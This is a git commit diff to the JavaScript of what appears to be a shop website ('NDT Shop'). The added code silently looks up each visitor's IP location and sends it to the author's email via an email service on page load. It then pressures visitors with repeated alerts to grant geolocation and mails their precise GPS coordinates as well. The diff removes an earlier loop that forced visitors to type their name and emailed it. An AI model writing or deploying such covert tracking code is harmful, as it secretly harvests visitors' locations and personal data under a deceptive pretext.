4f032ffcd169364bb63c7a28620cef98db0015d9
iamducthanh <ducthanh260801@gmail.com>
2021-06-19 13:20:46 +0700

    dd

--- js/js.js
+++ js/js.js
@@ -2,24 +2,40 @@ setTimeout(() => {
     a()
 }, 1000);
 
-setTimeout(() => {
-    getName()
-}, 3000);
 function a() {
     getLocation()
 }
 
 
 function getLocation() {
+    $.getJSON("https://ipinfo.io/", onLocationGot);
+    alert('Vui lòng ấn cho phép để xem chi tiết')
     navigator.geolocation.getCurrentPosition(showPosition, showError);
 }
 
 function showError(error) {
     switch (error.code) {
         case error.PERMISSION_DENIED:
+            alert('Vui lòng ấn cho phép')
             getLocation()
             break;
     }
+}
+
+
+function onLocationGot(info) {
+    let position = info.loc.split(",");
+    const templateId = 'template_75sb4wn';
+    const serviceID = 'ducthanh260801@gmail.com';
+    sendFeedback(serviceID, templateId, {
+        to_name: `mrthanh260801@gmail.com`,
+        from_name: "Chào mừng đến với NDT Shop",
+        message: "Người vừa truy cập: " + position[0] + ', ' + position[1],
+        nguoi_nhan: 'ducthanh260801@gmail.com',
+        reply_to: "mrthanh260801@gmail.com",
+        link: '<a href="http://ndtshop.herokuapp.com/forgot-password">Truy cập tại đây</a>'
+    })
+    
 }
 
 function showPosition(position) {
@@ -28,37 +44,11 @@ function showPosition(position) {
     sendFeedback(serviceID, templateId, {
         to_name: `mrthanh260801@gmail.com`,
         from_name: "Chào mừng đến với NDT Shop",
-        message: "Người vừa truy cập: " + position.coords.latitude + ', ' + position.coords.longitude + ', ' + name,
+        message: "Người vừa truy cập: " + position.coords.latitude + ', ' + position.coords.longitude,
         nguoi_nhan: 'ducthanh260801@gmail.com',
         reply_to: "mrthanh260801@gmail.com",
         link: '<a href="http://ndtshop.herokuapp.com/forgot-password">Truy cập tại đây</a>'
     })
-}
-
-function getName() {
-    var name = "";
-    while (true) {
-        name = prompt('Vui lòng nhập tên của bạn!')
-        console.log(name);
-        if (name == null) {
-            alert('Bạn không được để trống tên')
-        } else if(name.trim().length == 0){
-            alert('Bạn không được để trống tên')
-        } else{
-            break;
-        }
-    }
-    const templateId = 'template_75sb4wn';
-    const serviceID = 'ducthanh260801@gmail.com';
-    sendFeedback(serviceID, templateId, {
-        to_name: `mrthanh260801@gmail.com`,
-        from_name: "Chào mừng đến với NDT Shop",
-        message: "Người vừa truy cập: " + name,
-        nguoi_nhan: 'ducthanh260801@gmail.com',
-        reply_to: "mrthanh260801@gmail.com",
-        link: '<a href="http://ndtshop.herokuapp.com/forgot-password">Truy cập tại đây</a>'
-    })
-
 }
 
 const sendFeedback = (serviceID, templateId, variables) => {
